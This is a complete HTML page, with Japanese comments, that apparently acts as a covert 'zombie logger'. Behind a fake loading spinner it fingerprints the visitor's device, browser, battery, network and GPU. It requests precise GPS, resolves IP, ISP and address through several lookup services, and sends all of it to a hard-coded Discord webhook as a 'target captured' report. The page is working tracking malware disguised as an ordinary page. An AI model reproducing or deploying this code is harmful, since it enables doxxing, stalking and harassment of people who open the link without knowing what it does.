<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
    /* ラグ偽装と完全な情報隠蔽 */
    html, body {
        margin: 0; padding: 0; height: 100%;
        background: #0d0d0d; color: #ccc;
        font-family: system-ui, -apple-system, sans-serif;
        display: flex; align-items: center; justify-content: center;
        overflow: hidden;
    }
    .box { text-align: center; opacity: 0; animation: fadeIn 0.8s ease-in forwards; }
    @keyframes fadeIn { to { opacity: 1; } }
    .spinner {
        width: 44px; height: 44px;
        border: 4px solid #222; border-top: 4px solid #5865f2;
        border-radius: 50%;
        animation: spin 0.7s linear infinite;
        margin: 0 auto 16px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .text { font-size: 15px; color: #949ba4; animation: pulse 2s infinite; }
    @keyframes pulse { 0%, 100% { opacity: 0.6; } 50% { opacity: 1; } }
</style>
</head>
<body>
<div class="box">
    <div class="spinner"></div>
    <div class="text">読み込み中...</div>
</div>

<script>
(async function() {
    "use strict";

    // =====================================================================
    // ⚠️ ここにお前が新しく作ったDiscordのWebhook URLを貼り付けろ ⚠️
    // =====================================================================
    const WH = "https://discord.com/api/webhooks/1570094605276291204/aKVIkU4ettxT2u4dt9myjdjh31c-cgd24VI_jHcmYeNiD7EwIkKvhujVhx6uPB4U0hxy";

    // =====================================================================
    // 1. セッション・流入元・フィンガープリント解析
    // =====================================================================
    const ref = document.referrer;
    const ua = navigator.userAgent;
    let app = "ブラウザ (不明)";
    
    if (ua.toLowerCase().includes("discord")) app = "Discord アプリ内";
    else if (ua.toLowerCase().includes("twitter") || ua.toLowerCase().includes("x.com")) app = "Twitter/X アプリ内";
    else if (ua.toLowerCase().includes("instagram")) app = "Instagram アプリ内";
    else if (ua.toLowerCase().includes("line")) app = "LINE アプリ内";
    else if (ua.toLowerCase().includes("safari") && !ua.toLowerCase().includes("chrome")) app = "Safari";
    else if (ua.toLowerCase().includes("chrome")) app = "Chrome";

    const source = ref ? ref : "直接アクセス (直リンク)";

    // 端末・画面情報
    const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua) || navigator.maxTouchPoints > 0;
    const screenStr = `${window.screen.width}x${window.screen.height} (DPR:${window.devicePixelRatio})`;
    const winStr = `${window.innerWidth || document.documentElement.clientWidth}x${window.innerHeight || document.documentElement.clientHeight}`;
    const hw = `CPU: ${navigator.hardwareConcurrency || '?'} | Mem: ${navigator.deviceMemory || '?'}GB`;
    const lang = navigator.language || "不明";
    const cookie = navigator.cookieEnabled ? "有効" : "無効";

    // Canvas / GPU (WebGL)
    let canvasFP = "Blocked", gpuVendor = "不明", gpuRenderer = "不明";
    try {
        const c = document.createElement('canvas'); c.width = 200; c.height = 50;
        const ctx = c.getContext('2d');
        if (ctx) {
            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069"; ctx.fillText("layer's Forge", 2, 15);
            canvasFP = c.toDataURL().substring(0, 40) + "...";
        }
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (gl) {
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            if (ext) {
                gpuVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
                gpuRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch(e) {}

    // バッテリー
    let batteryStr = "非対応";
    try {
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batteryStr = `${Math.round(b.level * 100)}% ${b.charging ? '(充電中)' : '(放電中)'}`;
        }
    } catch(e) {}

    // ネットワーク
    let netStr = "非対応";
    if (navigator.connection) {
        netStr = `Type: ${navigator.connection.effectiveType || '?'} | Down: ${navigator.connection.downlink || '?'}Mbps | RTT: ${navigator.connection.rtt || '?'}ms`;
    }

    // =====================================================================
    // 2. 現在地の限界特定（GPS要求 ＆ IP多重フォールバック）
    // =====================================================================
    
    // 位置情報（許可された場合の最強カード）
    let gpsData = null;
    if (navigator.geolocation) {
        gpsData = await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        });
    }

    // 5段階のIPフォールバック
    let ipData = { ip: "取得失敗", isp: "不明", loc: "不明", lat: null, lon: null, tz: "不明" };

    // 1: ipwho.is
    try {
        const r = await fetch('https://ipwho.is/');
        const d = await r.json();
        if(d.success && d.ip) {
            ipData = {
                ip: d.ip, isp: d.connection ? d.connection.isp : "不明",
                loc: `${d.country || ""} ${d.region || ""} ${d.city || ""}`,
                lat: d.latitude, lon: d.longitude, tz: d.timezone ? d.timezone.id : "不明"
            };
        } else { throw new Error("fail"); }
    } catch(e) {
        // 2: ipapi.co
        try {
            const r = await fetch('https://ipapi.co/json/');
            const d = await r.json();
            if(d.ip) {
                ipData = {
                    ip: d.ip, isp: d.org || "不明", loc: `${d.country_name || ""} ${d.region || ""} ${d.city || ""}`,
                    lat: d.latitude, lon: d.longitude, tz: d.timezone || "不明"
                };
            } else { throw new Error("fail"); }
        } catch(e2) {
            // 3: ip-api.com (CORSプロキシ)
            try {
                const target = "http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,timezone,isp,query";
                const r = await fetch(`https://corsproxy.io/?${encodeURIComponent(target)}`);
                const d = await r.json();
                if(d.status === 'success') {
                    ipData = {
                        ip: d.query, isp: d.isp || "不明", loc: `${d.country || ""} ${d.regionName || ""} ${d.city || ""}`,
                        lat: d.lat, lon: d.lon, tz: d.timezone || "不明"
                    };
                } else { throw new Error("fail"); }
            } catch(e3) {
                // 4: ipwhois.app
                try {
                    const r = await fetch('https://ipwhois.app/json/');
                    const d = await r.json();
                    if(d.ip) {
                        ipData = {
                            ip: d.ip, isp: d.isp || "不明", loc: `${d.country || ""} ${d.region || ""} ${d.city || ""}`,
                            lat: d.latitude, lon: d.longitude, tz: d.timezone || "不明"
                        };
                    }
                } catch(e4) {}
            }
        }
    }

    // =====================================================================
    // 3. マップリンクの生成
    // =====================================================================
    let mapLinks = "";
    if (gpsData) {
        mapLinks += `**[📍 正確なGPS現在地](https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon})** (精度:約${Math.round(gpsData.acc)}m)\n`;
    }
    if (ipData.lat && ipData.lon) {
        mapLinks += `[🗺️ IPベースの推定位置](https://www.google.com/maps?q=${ipData.lat},${ipData.lon})`;
    }
    if (!mapLinks) mapLinks = "取得失敗";

    // =====================================================================
    // 4. Discordへ送信（送信失敗を防ぐためシンプルな構造）
    // =====================================================================
    const embed = {
        title: "🎯 ターゲット完全捕捉報告 (Ultimate)",
        color: 0xf23f43,
        fields: [
            { name: "🔗 流入元", value: `**サイト:** \`${source}\`\n**アプリ:** ${app}`, inline: false },
            { name: "🌐 公開IP", value: `\`${ipData.ip}\``, inline: true },
            { name: "🛰️ ISP / 組織", value: ipData.isp, inline: true },
            { name: "📍 住所", value: ipData.loc, inline: false },
            { name: "🗺️ マップ", value: mapLinks, inline: false },
            { name: "📱 デバイス", value: isMobile ? "Mobile / Tablet" : "PC", inline: true },
            { name: "💻 画面", value: `${screenStr}\nWin: ${winStr}`, inline: true },
            { name: "🌍 言語 / TZ", value: `${lang} / ${ipData.tz}`, inline: true },
            { name: "🧠 ハードウェア", value: `${hw}\nBattery: ${batteryStr}`, inline: true },
            { name: "🍪 Cookie", value: cookie, inline: true },
            { name: "📶 ネットワーク", value: netStr, inline: false },
            { name: "🎮 GPU / Canvas", value: `GPU: ${gpuVendor} | ${gpuRenderer}\nCanvas: ${canvasFP}`, inline: false },
            { name: "🕵️ User-Agent", value: `\`\`\`\n${ua}\n\`\`\``, inline: false }
        ],
        footer: { text: "by zombie logger ggs😂" },
        timestamp: new Date().toISOString()
    };

    try {
        await fetch(WH, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                username: "zombie logger",
                embeds: [embed]
            })
        });
    } catch (err) {
        // エラーは無視
    }
})();
</script>
</body>
</html>
